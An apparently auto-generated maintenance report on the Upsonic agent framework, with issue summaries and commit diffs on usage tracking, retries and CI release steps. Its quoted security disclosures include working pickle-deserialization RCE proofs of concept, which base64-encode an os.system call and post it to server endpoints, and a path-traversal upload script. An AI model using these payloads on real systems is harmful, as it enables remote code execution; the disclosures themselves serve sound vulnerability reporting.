        self.wrapped = wrapped
        super().__init__(object_def=wrapped.object_def)

    async def process(
        self,
        data: str,
        allow_partial: bool = False,
        wrap_validation_errors: bool = True,
    ) -> OutputDataT:
        text = _utils.strip_markdown_fences(data)

        return await self.wrapped.process(
            text, allow_partial=allow_partial, wrap_validation_errors=wrap_validation_errors
        )


@dataclass(init=False)
class PromptedOutputSchema(StructuredTextOutputSchema[OutputDataT]):
    @property
    def mode(self) -> OutputMode:
        return 'prompted'

```


### D2: Asynchronous State & Concurrency
- Analyzed concurrency guarantees, async pipelines, and event handling from PR resolutions and commit changes.

### D3: Error Boundaries, Recovery & Rollbacks
- Exception handling patterns and defect resolutions extracted from closed production bug issues:
- **Issue #376** (2026-01-28): **Context parameter in Task not working**
  *Symptoms*: **Context parameter in Task not working** **To Reproduce** Steps to reproduce the behavior: 1. Use this code (Basic example): ```python from upsonic import Task, Agent  # String as Context city = "New York"   # Creating Task task = Task(   "Find eating places in the city",   context=[city] # Adding city string as context )  # Creating Agent agent = Agent(name="City Guide")  # Running the task agent.print_do(task) ```  4. See error <img width="772" alt="Image" src="https://github.com/user-attachments/assets/5eb81ab6-7219-44bc-a194-52a564ef2595" />  **Expected behavior with my quick solution mentioned at the end** <img width="647" alt="Image" src="https://github.com/user-attachments/assets/a4eeb472-d6d6-492e-8fb4-c3883755b682" />   **Desktop (please complete the following information):**  - OS: [MacOS]  - Upsonic Version 0.59.11 - Python Version [3.11]   **Additional context** My quick **solution worked** : ```python task = Task(   "Find eating places in the city" + city,   #context=[city] # Adding city string as context ) ```  **Notes to team** Analyze here detailedly <img width="940" alt="Image" src="https://github.com/user-attachments/assets/e15160e3-72f8-4fab-9673-66e261559fd9" /> 
  **Post-Mortem & Fix Analysis**:
  > Hello, i will fix that.
  > Hey, If I understood the issue correctly, the problem is about passing the context into the prompt whenever it's a string. In the current code, it doesn't accept the string as context. I just added an `Additional Context` in the system instructions.  Here is the PR for it: https://github.com/Upsonic/Upsonic/pull/378  Current System Instructions: ```bash Find eating places in the city <Context> 	<Agents></Agents> 	<Tasks></Tasks> 	<Default Prompt>Default Prompt: You are a helpful assistant that can answer questions and help with tasks. Please be logical, concise, and to the point. Your provider is Upsonic. Think in your backend and dont waste time to write to the answer. Write only what the user want. About the context: If there is an Task context user want you to know that. Use it to think in your backend. </Default Prompt> 	<Knowledge Base></Knowledge Base> </Context> ```  System Instructions After the PR: ```bash Find eating places in the city <Context> 	<Agents></Agents> 	<Tasks></T
  > Hello, thanks for opening this.  We’ve recently shipped major updates and refactors, so I’m closing this for now.  Please feel free to try the latest version here: https://github.com/Upsonic/Upsonic  If the problem still exists or you have new feedback, please feel free to open a fresh issue.

- **Issue #359** (2026-01-28): **[Security] RCE in get_temporary_memory Function Due to Unsafe Pickle Deserialization in [Upsonic/Upsonic]**
  *Symptoms*: # RCE in get_temporary_memory Function Due to Unsafe Pickle Deserialization in [Upsonic/Upsonic]  ## Summary  When user is running Upsonic server, attacker can achieve RCE by sending well-designed crafted data.  Sink function:  - src/upsonic/server/level_two/server/server.py   - call_agent     - Agent.agent       - get_temporary_memory         - pickle.loads  Sink code snippet:  ```python def get_temporary_memory(agent_id: str) -> list:     serialized_messages = Configuration.get(f"temp_memory_{agent_id}")     if serialized_messages is None:         return None          # Deserialize messages from base64 encoded pickle     messages = pickle.loads(base64.b64decode(serialized_messages))     return messages ```    ## POC  ### build  ```shell mkdir Upsonic_test cd Upsonic_test git clone https://github.com/Upsonic/Upsonic.git cp Upsonic/Dockerfile . docker build -t Upsonic . ```  ### reproduce  Run the docker  ```shell docker run -d --name Upsonic Upsonic ```  Generate attack payload  ```python import pickle import os import base64 class Evil:     def __reduce__(self):         return (os.system, ("echo 'pwned by CoolwindHF'",))      evil = Evil() evil_pickled = pickle.dumps(evil, protocol=0) print(base64.b64encode(evil_pickled).decode())  # Y3Bvc2l4CnN5c3RlbQpwMAooVmVjaG8gJ3B3bmVkIGJ5IENvb2x3aW5kSEYnCnAxCnRwMgpScDMKLg== ```  As we can see, via the function `src/upsonic/server/storage/server/server.py#set_config`, as well as the route named `/storage/config/set`, we can set any key
  **Post-Mortem & Fix Analysis**:
  > Closing this for the same reason mentioned above. Please refer to the previous comment for details. Thanks.

- **Issue #358** (2026-01-28): **[Security] RCE in call_agent Function Due to Unsafe Pickle Deserialization in [Upsonic/Upsonic]**
  *Symptoms*: # RCE in call_agent Function Due to Unsafe Pickle Deserialization in [Upsonic/Upsonic]  ## Summary  When user is running Upsonic server, attacker can achieve RCE by sending well-designed crafted data.  Sink function:  - src/upsonic/server/level_two/server/server.py   - call_agent     - cloudpickle.loads (at line 49)  Sink code snippet:  ```python async def call_agent(request: AgentRequest):     try:         # Handle pickled response format         if request.response_format != "str":             try:                 # Decode and unpickle the response format                 pickled_data = base64.b64decode(request.response_format)                 response_format = cloudpickle.loads(pickled_data)                                  ... ```  ## POC  ### build  ```shell mkdir Upsonic_test cd Upsonic_test git clone https://github.com/Upsonic/Upsonic.git cp Upsonic/Dockerfile . docker build -t Upsonic . ```  ### reproduce  Run the docker  ```shell docker run -d --name Upsonic Upsonic ```  Generate attack payload  ```python import pickle import os import base64 class Evil:     def __reduce__(self):         return (os.system, ("echo 'pwned by CoolwindHF'",))      evil = Evil() evil_pickled = pickle.dumps(evil, protocol=0) print(base64.b64encode(evil_pickled).decode())  # Y3Bvc2l4CnN5c3RlbQpwMAooVmVjaG8gJ3B3bmVkIGJ5IENvb2x3aW5kSEYnCnAxCnRwMgpScDMKLg== ```  Then send the base64 encoded payload to the server, you can find the command is executed  <img width="1524" alt="Image" src="https://g
  **Post-Mortem & Fix Analysis**:
  > Closing this for the same reason mentioned before. Please refer to the previous comment for details. Thanks.

- **Issue #357** (2026-01-28): **[Security] RCE in call_agent Function Due to Unsafe Pickle Deserialization in [Upsonic/Upsonic]**
  *Symptoms*: # RCE in call_agent Function Due to Unsafe Pickle Deserialization in [Upsonic/Upsonic]  ## Summary  When user is running Upsonic server, attacker can achieve RCE by sending well-designed crafted data.  Sink function:  - src/upsonic/server/level_two/server/server.py   - call_agent     - cloudpickle.loads (at line 65)  Sink code snippet:  ```python async def call_agent(request: AgentRequest): 			... 			... 			         if request.context is not None:             try:                 pickled_context = base64.b64decode(request.context)                 context = cloudpickle.loads(pickled_context)                        ... ```    ## POC  ### build  ```shell mkdir Upsonic_test cd Upsonic_test git clone https://github.com/Upsonic/Upsonic.git cp Upsonic/Dockerfile . docker build -t Upsonic . ```  ### reproduce  Run the docker  ```shell docker run -d --name Upsonic Upsonic ```  Generate attack payload  ```python import pickle import os import base64 class Evil:     def __reduce__(self):         return (os.system, ("echo 'pwned by CoolwindHF'",))      evil = Evil() evil_pickled = pickle.dumps(evil, protocol=0) print(base64.b64encode(evil_pickled).decode())  # Y3Bvc2l4CnN5c3RlbQpwMAooVmVjaG8gJ3B3bmVkIGJ5IENvb2x3aW5kSEYnCnAxCnRwMgpScDMKLg== ```  Then send the base64 encoded payload to the server, you can find the command is executed  <img width="1524" alt="Image" src="https://github.com/user-attachments/assets/95677e75-4bdb-4f15-9877-9423aaa1f3eb" />  <img width="788" alt="Image" src="htt
  **Post-Mortem & Fix Analysis**:
  > Hello, thanks for opening this. Since Upsonic went through multiple transitions (GCA to early Upsonic to current version), many older issues and PRs are no longer relevant to the current architecture.  We’ve recently shipped major updates and refactors, so I’m closing this for now.  Please feel free to try the latest version here: https://github.com/Upsonic/Upsonic  If the problem still exists or you have new feedback, please feel free to open a fresh issue.

- **Issue #356** (2026-01-28): **[Security] Path Traversal Vulnerability in File Upload Function of Upsonic/Upsonic**
  *Symptoms*: # Path Traversal Vulnerability in File Upload Function of Upsonic/Upsonic  # Summary  Attackers can exploit a directory traversal vulnerability by manipulating the filename parameter in the file upload function to create arbitrary files on the target host. The vulnerability originates from line 39 in `markdown/server.py`, where the code `file_path = os.path.join(temp_dir, file.filename)` does not sanitize the file.filename.  # POC  ## Build  Follow these steps to set up the test environment:  ```shell mkdir Upsonic_test cd Upsonic_test git clone https://github.com/Upsonic/Upsonic cp Dockerfile .. ; cd .. sudo docker build -t upsonic_test . ```  ## Reproduce  - Start the Docker container:  ```shell sudo docker run -v -d -p 5901:5901 -p 7541:7541 upsonic_test ```  - Use Python to send a malicious request:  ```python import requests  # Endpoint URL url = "http://127.0.0.1:7541/markdown/upload"  # Create the file that the attacker wants to upload file_path = "flag" with open(file_path, "wb") as file:     file.write(b"hacked!")  # Open and send the file with open(file_path, "rb") as file:     files = {"file": ("../flag", file)}     try:         response = requests.post(url, files=files)                  # Check if the request was successful         if response.status_code == 200:             print("Success! Markdown content:")             print(response.json().get("markdown"))         else:             print(f"Error: {response.status_code} - {response.text}")                  exce
  **Post-Mortem & Fix Analysis**:
  > Hello, thanks for opening this. We’ve recently shipped major updates and refactors, so I’m closing this for now.  Please feel free to try the latest version here: https://github.com/Upsonic/Upsonic  If the problem still exists or you have new feedback, please feel free to open a fresh issue.

- **Issue #355** (2026-01-28): **[Security] RCE in call_gpt4o Function and Multiple Functions Due to Unsafe Pickle Deserialization in [Upsonic/Upsonic]**
  *Symptoms*: # Summmary  When user is runing Upsonic, attacker via multiple interface to achieve RCE by sending carefully crafted data.  Affected interfaces include:  - /level_two/agent - /level_one/gpt4o  # Reproduce  Let's take the call_gpt4o interface as an example.  ## run  ```bash docker run -p 7541:7541 upsonic/server ```  ## poc  ```python import pickle import base64 import requests import os  class PickleRCE(object):     def __reduce__(self):         command = "whoami"         return (os.system, (command,))  serialized_data = pickle.dumps(PickleRCE()) response_format_b64 = base64.b64encode(serialized_data).decode('utf-8')  payload = {     "prompt": "foo",     "images": [],     "response_format": response_format_b64,     "tools": "foo",     "context": "foo",     "llm_model": "foo",     "system_prompt": "foo" }  url = "http://127.0.0.1:7541/level_one/gpt4o" headers = {"Content-Type": "application/json"}  response = requests.post(url, json=payload, headers=headers)  print(f"Status Code: {response.status_code}") print(f"Response Content: {response.text}") ```  upsonic server docker logs:  ![Image](https://github.com/user-attachments/assets/68a8638c-c052-4dd3-a7cd-0e2f0bbfe9f8)  # Impact  RCE  # Credit  The vulnerability was discovered by Tencent YunDing Security Lab.
  **Post-Mortem & Fix Analysis**:
  > Closing this for the same reason mentioned before. Please refer to the previous comment for details. Thanks.

- **Issue #354** (2026-01-27): **[BUG] The backend task cannot be terminated and is in a hung state, making it impossible to exit completely.**
  *Symptoms*: **Describe the bug** When I used the route_weather_check.py from the browser-use directory in the cookbook for testing, I found that browser-use became unresponsive when handling the login request. After closing the route_weather_check.py test task in the console, the backend browser process kept running and could not be completely terminated. I hope a task timeout mechanism can be added, and that when the frontend task is closed, a signal can be sent to the backend task to exit. **To Reproduce** Steps to reproduce the behavior: 1. Use this code: ```python from upsonic import Agent, Task, ObjectResponse from upsonic.client.tools import BrowserUse # Importing BrowserUse import os os.environ["UPSONIC_TELEMETRY"] = "False" route_weather_agent = Agent("Route Weather Checker", model="openai/gpt-4.1-mini", reflection=True) #If you yuse to Azure please do model="azure/gpt-4o"   # Define response format for creating route class Route(ObjectResponse):     cities_between_two_cities: list[str]  # Define response format for weather  class RouteWeather(ObjectResponse):     drive_route: list[str]     cities_temperature: list[str]     cities_condition: list[str]   # Change `starting_city` and `destination_city` to customize the route. starting_city = "San Francisco" destination_city= "Santa Cruz"  # Task to find for cities between two city most fastly route using Browser Use route_task = Task(     "Find all cities between two cities the fastly driving route.",     tools=[BrowserUse],     re
  **Post-Mortem & Fix Analysis**:
  > Hello, thanks for opening this. Since Upsonic went through multiple transitions (GCA to early Upsonic to current version), many older issues and PRs are no longer relevant to the current architecture.  We’ve recently shipped major updates and refactors, so I’m closing this for now.  Please feel free to try the latest version here: https://github.com/Upsonic/Upsonic  If the problem still exists or you have new feedback, please feel free to open a fresh issue.

- **Issue #353** (2026-01-28): **[Security] RCE in add_tool Function Due to Unsafe Pickle Deserialization in [Upsonic/Upsonic]**
  *Symptoms*: # RCE in add_tool Function Due to Unsafe Pickle Deserialization in [Upsonic/Upsonic]  # Summmary  When user is runing Upsonic, attacker via /tools/add_tool to achieve RCE by sending carefully crafted data.  + function call stack:   + add_tool     + cloudpickle.loads(decoded_function)    # POC  ## build  ```shell mkdir Upsonic_test cd Upsonic_test git clone https://github.com/Upsonic/Upsonic cp Dockerfile .. ;cd .. sudo docker build -t upsonic_test . ```    ## reproduce  + run: `sudo docker run -v -d -p 5901:5901 -p 7541:7541 upsonic_test`    ```   $ sudo docker run -v -d -p 5901:5901 -p 7541:7541 upsonic_test      New 'X' desktop is 8c9746dbd78d:1      Starting applications specified in /home/docker/.vnc/xstartup   Log file is /home/docker/.vnc/8c9746dbd78d:1.log      INFO:     Started server process [9]   INFO:     Waiting for application startup.   INFO:     Application startup complete.   INFO:     Uvicorn running on http://localhost:8086 (Press CTRL+C to quit)   INFO:     Started server process [28]   INFO:     Waiting for application startup.   INFO:     Application startup complete.   INFO:     Uvicorn running on http://0.0.0.0:7541 (Press CTRL+C to quit)      ```  + now, run the following script to attack Upsonic:    + cmd:The shell command you want to run on the Upsonic    ```python   import pickle   import base64   import requests   import json   import argparse      class Evil_Data(dict):       def __init__(self, src: str, **kwargs):           super().__init__(**kwa
  **Post-Mortem & Fix Analysis**:
  > Hi @onuratakan ,   I have reported a remote code execution (RCE) vulnerability in the project and provided steps to reproduce and a proof of concept. As this vulnerability may pose a serious security threat to project users, I suggest applying for a **CVE** number for this vulnerability to facilitate tracking and disclosure. I would like to ask if you can assist in submitting a CVE request or if there is a specific process that I need to cooperate with? If additional information or support is required, I am happy to provide it.   Thank you for your attention and support for project security!   Best wishes, 7resp4ss
  > Closing this for the same reason mentioned above. Please refer to the previous comment for details. Thanks.

### D4: Resource Lifecycle & Leak Defenses
- Memory allocation, socket lifecycle, and handle cleanup observed from bug fixes and PR deltas.

### D5: Boundary Deserialization & Encoding
- Schema deserialization, payload validation, and untrusted input guards.

### D6: Cross-Platform & Runtime Gotchas
- Platform variance, OS-specific gotchas, and environment discrepancies detected in issue reports.

### D7: Build, CI/CD, Deployment & Tooling
- Toolchain requirements, dependencies, and packaging specs verified against remote manifests.

### D8: Forensic Bug Fixes & Real Production Code Patches
Observed empirical fixes and code patches:

### Incident Patch 1: `655c4d30` (2026-06-15)
**Commit Message**: Merge pull request #615 from Upsonic/add-security-policy

docs: add SECURITY.md with responsible disclosure policy

**File**: `SECURITY.md` (added, +35/-0)
```diff
@@ -0,0 +1,35 @@
+# Security Policy
+
+## Responsible Disclosure
+
+If you believe you have found a security vulnerability in Upsonic Platform, please report it to `security@upsonic.co`.
+
+Please include:
+
+- A clear description of the issue and its impact.
+- Steps to reproduce the behavior.
+- Any proof-of-concept code, requests, or screenshots that help us validate the report.
+- Your preferred contact information for follow-up.
+
+## Scope
+
+This policy covers security vulnerabilities in this repository and the software it ships.
+
+Please do not use public issues, pull requests, or other public channels for vulnerability reports.
+
+## Response Expectations
+
+We will acknowledge receipt of a report within 7 business days.
+
+We aim to investigate validated reports promptly and target coordinated disclosure within 90 days, depending on severity and remediation complexity.
+
+## Researcher Expectations
+
+Please act in good faith and avoid:
+
+- Accessing, modifying, or deleting data that does not belong to you.
+- Disrupting service availability or degrading the experience for other users.
+- Using social engineering, spam, or physical attacks.
+- Publicly disclosing a vulnerability before we have had a reasonable opportunity to investigate and remediate it.
+
+We will treat good-faith security research intended to improve the safety of our systems as responsible disclosure.
```

---

### Incident Patch 2: `eca02d43` (2026-06-15)
**Commit Message**: docs: add SECURITY.md with responsible disclosure policy

**File**: `SECURITY.md` (added, +35/-0)
```diff
@@ -0,0 +1,35 @@
+# Security Policy
+
+## Responsible Disclosure
+
+If you believe you have found a security vulnerability in Upsonic Platform, please report it to `security@upsonic.co`.
+
+Please include:
+
+- A clear description of the issue and its impact.
+- Steps to reproduce the behavior.
+- Any proof-of-concept code, requests, or screenshots that help us validate the report.
+- Your preferred contact information for follow-up.
+
+## Scope
+
+This policy covers security vulnerabilities in this repository and the software it ships.
+
+Please do not use public issues, pull requests, or other public channels for vulnerability reports.
+
+## Response Expectations
+
+We will acknowledge receipt of a report within 7 business days.
+
+We aim to investigate validated reports promptly and target coordinated disclosure within 90 days, depending on severity and remediation complexity.
+
+## Researcher Expectations
+
+Please act in good faith and avoid:
+
+- Accessing, modifying, or deleting data that does not belong to you.
+- Disrupting service availability or degrading the experience for other users.
+- Using social engineering, spam, or physical attacks.
+- Publicly disclosing a vulnerability before we have had a reasonable opportunity to investigate and remediate it.
+
+We will treat good-faith security research intended to improve the safety of our systems as responsible disclosure.
```

---

### Incident Patch 3: `4dc6f602` (2026-05-19)
**Commit Message**: fix: TECH-1625 centralized usage registry (#602)

* feat(usage-registry): Phase 0 foundation — UsageEntry / AggregatedUsage / UsageRegistry

Adds src/upsonic/usage_registry/ as the in-memory backbone for a single
source of truth for token / cost / timing across Agent, Task, Chat,
Team, Workflow, and system (Memory / Reliability) execution scopes.

- UsageEntry: append-only ledger row tagged with any subset of
  chat/agent/task/team/workflow/system_usage_id. Idempotent by entry_id
  — re-recording the same id replaces (not double-counts), removing the
  need for the baseline/snapshot/subtract arithmetic TaskUsage uses
  today to survive retries.
- AggregatedUsage: read-only roll-up; shape mirrors TaskUsage so
  Phase 3 read-through wrappers drop in without changing callers.
- UsageRegistry: thread-safe dict keyed by entry_id, scope filtering
  with AND semantics, convenience by_chat/by_agent/by_task/by_team/
  by_workflow shortcuts.
- new_usage_id(scope): uuid4 with a scope prefix for readable logs.
- get_default_registry(): process-wide singleton for in-memory mode.

No integration with existing usage.py yet — this commit only adds new
code paths. 31 unit tests cover defaults, tota

**File**: `Docs` (modified, +1/-1)
```diff
@@ -1 +1 @@
-Subproject commit 0bc1d3a55d2876b9be44b552d63b18748b6f1cf7
+Subproject commit bb45ef5bc040558e492cf7ae53a359b4c878624f
```

**File**: `src/upsonic/agent/agent.py` (modified, +151/-288)
```diff
@@ -248,6 +248,7 @@ def __init__(
         context_management_model: Optional[str] = None,
         reliability_layer: Optional[Any] = None,
         agent_id_: Optional[str] = None,
+        agent_usage_id: Optional[str] = None,
         canvas: Optional["Canvas"] = None,
         retry: int = 1,
         mode: RetryMode = "raise",
@@ -391,7 +392,8 @@ def __init__(
 
         self.name = name
         self.agent_id_ = agent_id_
-        
+        self._agent_usage_id = agent_usage_id
+
         # Session/user overrides
         self._override_session_id = session_id
         self._override_user_id = user_id
@@ -578,8 +580,6 @@ def __init__(
         self._tool_call_count = 0
         self._tool_limit_reached = False
         
-        # Agent-level accumulated usage across all tasks
-        self.usage: Optional["AgentUsage"] = None
         
         # Run cancellation tracking
         self.run_id: Optional[str] = None
@@ -779,7 +779,31 @@ def agent_id(self) -> str:
         if self.agent_id_ is None:
             self.agent_id_ = str(uuid.uuid4())
         return self.agent_id_
-    
+
+    @property
+    def agent_usage_id(self) -> str:
+        """Stable id used by the usage registry to tag every ledger entry
+        produced by this agent. Lazily generated; distinct from
+        :attr:`agent_id` so callers can scope usage across many agents that
+        share the same logical agent_id (e.g. recreated per-request)."""
+        if self._agent_usage_id is None:
+            from upsonic.usage_registry import new_usage_id
+            self._agent_usage_id = new_usage_id("agent")
+        return self._agent_usage_id
+
+    @property
+    def usage(self) -> Any:
+        """Aggregated token / cost / timing for every ledger entry
+        recorded under this agent's scope.
+
+        Returns an :class:`AggregatedUsage` view derived from the
+        usage registry. Shape is API-compatible with the previous
+        ``AgentUsage`` (input_tokens, output_tokens, requests, cost,
+        duration, ...) so callers don't need to know it's now derived.
+        """
+        from upsonic.usage_registry import get_default_registry
+        return get_default_registry().by_agent(self.agent_usage_id)
+
     @property
     def session_id(self) -> Optional[str]:
         """Get session_id from override, memory, or db."""
@@ -885,56 +909,6 @@ async def aget_session_usage(self) -> "TaskUsage":
 
         return TaskUsageCls()
 
-    @property
-    def cost(self) -> Optional[Dict[str, Any]]:
-        """
-        Aggregated token usage and estimated cost across every task this
-        agent has executed.
-
-        Mirrors the shape of :meth:`Task.get_total_cost` but accumulates
-        across all ``do`` / ``do_async`` / ``run`` / ``run_async`` calls
-        on this agent instance. Autonomous agents (and prebuilts like
-        :class:`AppliedScientist`) frequently dispatch several tasks per
-        run — bootstrap, workspace greeting, the user's prompt, internal
-        sub-agents — so ``autonomous_agent.cost`` reports the full session
-        spend, not just the last task.
-
-        Returns:
-            Dict with ``input_tokens``, ``output_tokens``, ``total_tokens``,
-            ``estimated_cost`` (USD), ``requests``, ``tool_calls``,
-            ``cache_read_tokens``, ``cache_write_tokens``, and
-            ``reasoning_tokens``. ``estimated_cost`` is ``None`` when the
-            model's pricing cannot be resolved. Returns ``None`` if no
-            tasks have been executed yet.
-        """
-        usage = self.usage
-        if usage is None:
-            return None
-
-        input_tokens: int = usage.input_tokens or 0
-        output_tokens: int = usage.output_tokens or 0
-
-        estimated_cost: Optional[float] = usage.cost
-        if estimated_cost is None:
-            try:
-                from upsonic.utils.usage import calculate_cost_from_usage
-                model = self.model or self.model_name
-          
```

**File**: `src/upsonic/agent/context_managers/call_manager.py` (modified, +1/-12)
```diff
@@ -52,11 +52,7 @@ async def afinalize(self) -> None:
             self.start_time = self.end_time
 
     async def alog_completion(self, context: "AgentRunOutput") -> None:
-        """Log the completion with usage tracking, Tool Calls, LLM Result, and Task Metrics.
-
-        This is the single printing entry-point for completed runs.
-        It calls ``call_end`` (which prints Tool Calls + LLM Result
-        and tracks price_id) and then ``print_price_id_summary`` (Task Metrics).
+        """Log the completion with usage tracking, Tool Calls and LLM Result.
 
         Args:
             context: AgentRunOutput object containing messages and output.
@@ -110,17 +106,10 @@ async def alog_completion(self, context: "AgentRunOutput") -> None:
             usage,
             tool_usage_result,
             self.debug,
-            getattr(self.task, 'price_id', None),
             print_output=self.print_output,
             show_tool_calls=self.show_tool_calls,
         )
 
-        if self.task and not getattr(self.task, 'not_main_task', False):
-            from upsonic.utils.printing import print_price_id_summary, price_id_summary
-            price_id: Optional[str] = getattr(self.task, 'price_id', None)
-            if price_id and price_id in price_id_summary:
-                print_price_id_summary(price_id, self.task, print_output=self.print_output)
-
     def prepare(self) -> None:
         """Synchronous version of aprepare."""
         import asyncio
```

**File**: `src/upsonic/agent/context_managers/context_manager.py` (modified, +2/-5)
```diff
@@ -287,11 +287,8 @@ def get_context_summary(self) -> Dict[str, Any]:
                 "not_main_task": self.task.not_main_task,
                 "start_time": self.task.start_time,
                 "end_time": self.task.end_time,
-                "duration": self.task.duration,
-                "price_id": self.task.price_id,
-                "total_cost": self.task.total_cost,
-                "total_input_tokens": self.task.total_input_token,
-                "total_output_tokens": self.task.total_output_token,
+                "duration": self.task.usage.duration,
+                "task_usage_id": self.task.task_usage_id,
                 "tool_calls_count": len(self.task.tool_calls) if self.task.tool_calls else 0,
                 "query_knowledge_base": self.task.query_knowledge_base
             },
```

**File**: `src/upsonic/agent/context_managers/system_prompt_manager.py` (modified, +4/-7)
```diff
@@ -416,16 +416,13 @@ async def aprepare(
         Args:
             memory_handler: Optional MemoryManager for memory and culture injection
         """
-        # Prepare culture if needed (async) - must be done before _build_system_prompt
+        # Prepare culture if needed (async) - must be done before _build_system_prompt.
+        # Culture's own LLM call already lands in the usage registry under
+        # the active agent_usage_id / task_usage_id; no manual roll-up onto
+        # the parent's run output is needed.
         if self.agent._culture_manager and self.agent._culture_manager.enabled:
             if not self.agent._culture_manager.prepared:
                 await self.agent._culture_manager.aprepare()
-            
-            # Drain culture extraction LLM usage into parent agent's run output
-            if hasattr(self.agent, '_agent_run_output') and self.agent._agent_run_output:
-                culture_usage = self.agent._culture_manager.drain_accumulated_usage()
-                if culture_usage:
-                    self.agent._agent_run_output.usage.incr(culture_usage)
         
         # Build system prompt (culture will be injected in _build_system_prompt if prepared)
         self.system_prompt = self._build_system_prompt(memory_handler)
```

---

### Incident Patch 4: `12f3ac2e` (2026-05-16)
**Commit Message**: fix(chat,messages): tolerate trailing junk in tool args and reset task on retry (#597) (#598)

- ToolCallPart.args_as_dict() now falls back to JSONDecoder.raw_decode when
  pydantic_core.from_json sees trailing characters, so providers that append
  harmony-format tokens after the JSON args (e.g. Gemma 4 via OpenRouter) no
  longer crash the streaming pipeline.

- Chat retry paths (_invoke_blocking_async, _stream_with_retry,
  _stream_events_with_retry) now reset task.status/run_id before each retry
  attempt, mirroring do_async's internal behavior. Previously the previous
  attempt's mark_completed leaked onto the task and the next attempt tripped
  _validate_task_for_new_run with "Task is already completed", silently
  swallowing the retry.

Co-authored-by: Claude Opus 4.7 (1M context) <noreply@anthropic.com>

**File**: `src/upsonic/chat/chat.py` (modified, +27/-3)
```diff
@@ -770,7 +770,18 @@ async def _invoke_blocking_async(
         """Handle blocking invocation."""
         from upsonic.run.agent.output import AgentRunOutput as AgentRunOutputConcrete
 
+        attempt_counter = {"n": 0}
+
         async def _execute() -> Union[str, InvokeResult]:
+            if attempt_counter["n"] > 0:
+                # Reset task state so the next attempt is treated as a fresh
+                # run. Without this, do_async's _validate_task_for_new_run
+                # would short-circuit with "Task is already completed" once
+                # the previous attempt's pipeline marked the task.
+                task.status = None
+                task.run_id = None
+            attempt_counter["n"] += 1
+
             if self.debug and self.debug_level >= 2:
                 from upsonic.utils.printing import debug_log_level2
                 debug_log_level2(
@@ -782,7 +793,7 @@ async def _execute() -> Union[str, InvokeResult]:
                     user_id=self.user_id,
                     task_description=task.description[:300] if task.description else None,
                 )
-            
+
             if return_run_output:
                 result = await self.agent.do_async(task, debug=self.debug, return_output=True, **kwargs)
                 if not isinstance(result, AgentRunOutputConcrete):
@@ -837,9 +848,17 @@ async def _execute_streaming() -> AsyncIterator[str]:
         async def _stream_with_retry() -> AsyncIterator[str]:
             last_exception = None
             stream_generator = None
-            
+
             try:
                 for attempt in range(self._retry_attempts + 1):
+                    if attempt > 0:
+                        # Reset task state so the next attempt is treated as a
+                        # fresh run. The previous attempt's pipeline may have
+                        # synced a completed/error status onto the task; without
+                        # this reset, _validate_task_for_new_run would short-
+                        # circuit with "Task is already completed".
+                        task.status = None
+                        task.run_id = None
                     try:
                         stream_generator = _execute_streaming()
                         async for chunk in stream_generator:
@@ -853,7 +872,7 @@ async def _stream_with_retry() -> AsyncIterator[str]:
                             except Exception:
                                 pass
                             stream_generator = None
-                        
+
                         if "context manager is already active" in str(exc):
                             if self.debug:
                                 from upsonic.utils.printing import debug_log
@@ -904,6 +923,11 @@ async def _stream_events_with_retry() -> AsyncIterator[AgentEvent]:
             
             try:
                 for attempt in range(self._retry_attempts + 1):
+                    if attempt > 0:
+                        # Reset task state so the next attempt is treated as a
+                        # fresh run (see _stream_with_retry for rationale).
+                        task.status = None
+                        task.run_id = None
                     try:
                         stream_generator = _execute_streaming_events()
                         async for event in stream_generator:
```

**File**: `src/upsonic/messages/messages.py` (modified, +8/-1)
```diff
@@ -1278,7 +1278,14 @@ def args_as_dict(self) -> dict[str, Any]:
             return {}
         if isinstance(self.args, dict):
             return self.args
-        args = pydantic_core.from_json(self.args)
+        try:
+            args = pydantic_core.from_json(self.args)
+        except ValueError:
+            # Some providers (e.g. Gemma via OpenRouter with harmony-format
+            # output) append non-JSON trailing tokens after the valid args
+            # object. Recover the leading JSON object and discard the rest.
+            import json as _json
+            args, _ = _json.JSONDecoder().raw_decode(self.args)
         assert isinstance(args, dict), 'args should be a dict'
         return cast(dict[str, Any], args)
 
```

---

### Incident Patch 5: `f0277e82` (2026-05-15)
**Commit Message**: fix(ci): use uv publish instead of pypa action

**File**: `.github/workflows/release.yml` (modified, +1/-3)
```diff
@@ -87,9 +87,7 @@ jobs:
         run: uv build
 
       - name: Publish package to PyPI
-        uses: pypa/gh-action-pypi-publish@cef221092ed1bacb1cc03d23a2d87d1d172e277b # release/v1
-        with:
-          packages-dir: dist/
+        run: uv publish -t ${{ secrets.THE_PYPI_TOKEN }}
 
   notify-slack:
     needs: [release-please, publish]
```

---

### Incident Patch 6: `2d9324ad` (2026-05-15)
**Commit Message**: fix(ci): refresh uv.lock at release and update release-please config

**File**: `.github/workflows/release.yml` (modified, +40/-0)
```diff
@@ -11,6 +11,8 @@ jobs:
       contents: write
       pull-requests: write
     outputs:
+      pr: ${{ steps.release.outputs.pr }}
+      prs_created: ${{ steps.release.outputs.prs_created }}
       release_created: ${{ steps.release.outputs.release_created }}
       tag_name: ${{ steps.release.outputs.tag_name }}
       version: ${{ steps.release.outputs.version }}
@@ -22,6 +24,44 @@ jobs:
           release-type: python
           target-branch: master
 
+  refresh-lockfile:
+    runs-on: ubuntu-latest
+    needs: release-please
+    if: needs.release-please.outputs.prs_created == 'true'
+    permissions:
+      contents: write
+    env:
+      RELEASE_BRANCH: ${{ fromJSON(needs.release-please.outputs.pr).headBranchName }}
+    steps:
+      - name: Check out release PR branch
+        uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6
+        with:
+          ref: ${{ env.RELEASE_BRANCH }}
+
+      - name: Set up Python
+        uses: actions/setup-python@a309ff8b426b58ec0e2a45f0f869d46889d02405 # v6.2.0
+        with:
+          python-version: "3.12"
+
+      - name: Install uv
+        uses: astral-sh/setup-uv@08807647e7069bb48b6ef5acd8ec9567f424441b # v8.1.0
+        with:
+          version: "latest"
+
+      - name: Refresh uv.lock
+        run: uv lock
+
+      - name: Commit refreshed lockfile
+        run: |
+          if git diff --quiet --exit-code -- uv.lock; then
+            exit 0
+          fi
+          git config user.name github-actions[bot]
+          git config user.email 41898282+github-actions[bot]@users.noreply.github.com
+          git add uv.lock
+          git commit -m "chore: refresh uv.lock for release PR [skip ci]"
+          git push origin "HEAD:${RELEASE_BRANCH}"
+
   publish:
     runs-on: ubuntu-latest
     needs: release-please
```

**File**: `release-please-config.json` (modified, +3/-1)
```diff
@@ -5,5 +5,7 @@
       "package-name": "upsonic",
       "release-type": "python"
     }
-  }
+  },
+  "include-v-in-tag": true,
